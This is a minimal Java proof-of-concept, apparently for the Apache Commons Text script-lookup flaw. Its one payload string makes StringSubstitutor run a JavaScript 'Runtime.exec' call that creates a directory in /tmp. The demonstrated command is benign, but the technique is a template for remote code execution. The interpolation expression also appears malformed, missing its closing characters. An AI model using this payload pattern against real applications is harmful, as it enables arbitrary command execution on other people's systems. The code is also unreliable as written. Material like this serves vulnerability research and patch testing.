package org.evbb;

import org.apache.commons.text.StringSubstitutor;
public class App
{
    public static void main( String[] args ) {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('mkdir /tmp/cve-2022-42899");
    }
}
